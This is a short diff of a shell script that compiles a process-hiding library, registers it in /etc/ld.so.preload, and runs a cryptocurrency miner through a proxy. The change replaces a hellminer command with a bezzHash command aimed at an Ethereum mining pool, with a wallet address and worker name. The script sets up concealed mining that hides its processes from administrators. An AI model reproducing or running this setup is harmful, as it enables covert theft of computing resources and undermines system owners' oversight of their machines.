@@ -46,5 +46,6 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
 mv libprocesshider.so /usr/local/lib/ 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
- 
-./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RD16VXGC5W1xuD8GXfeCtkDKEgkRamJkiV.Simbah -p x --cpu $(nproc --all)
+
+
+./graftcp/graftcp ./bezzHash -a ETHASH --pool eth-hk.flexpool.io:5555 --tls on --user 0xa8182456995a5b33df2907ddcaae9ad2a50b42a0 --worker PRABU --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
